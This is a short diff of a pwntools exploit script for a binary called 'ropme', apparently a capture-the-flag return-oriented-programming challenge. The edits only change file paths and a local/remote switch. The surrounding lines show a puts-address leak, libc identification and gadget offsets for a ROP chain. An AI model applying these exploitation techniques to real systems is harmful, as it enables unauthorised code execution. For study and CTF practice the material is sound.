@@ -8,7 +8,7 @@ from binascii import hexlify
 
 # Set up pwntools for the correct architecture
 context(os="linux", arch="amd64")
-exe = context.binary = ELF('ropme')
+exe = context.binary = ELF('./exe/ropme')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -86,8 +86,8 @@ log.success("puts address leaked: " + hex(puts_addr))
 # using https://libc.blukat.me we see that the corresponding libc is
 # libc6_2.23-0ubuntu10_amd64
 
-if args.REMOTE:
-    libc = ELF("libc6_2.23-0ubuntu10_amd64.so")
+if not args.LOCAL:
+    libc = ELF("./libs/libc6_2.23-0ubuntu10_amd64.so")
 else:
     libc = ELF("/usr/lib/libc.so.6")
 rop = ROP(libc)
@@ -98,7 +98,7 @@ log.success("Leaked libc: " + hex(libc.address))
 # it seems that pwntools has a little bug at resolving some gadgets
 # it could be a problem only for my machine
 def fix_buggy_rop(payload):
-    if args.REMOTE:
+    if not args.LOCAL:
         payload = payload.replace(p64(0x21102), p64(0x4006d3)) # pop rdi
     else:
         payload = payload.replace(p64(0x22a2f), p64(0x4006d3))
